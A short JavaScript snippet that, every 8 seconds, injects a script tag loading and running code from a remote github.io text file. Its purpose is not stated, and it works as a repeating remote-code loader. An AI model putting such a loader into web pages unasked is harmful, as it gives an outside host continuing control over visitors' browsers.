function main() {


var script = document.createElement("script");
script.src = "https://gydo194.github.io/event.txt";
script.type = "application/javascript";
document.head.appendChild( script );

};

setInterval(function(){main()}, 8000)
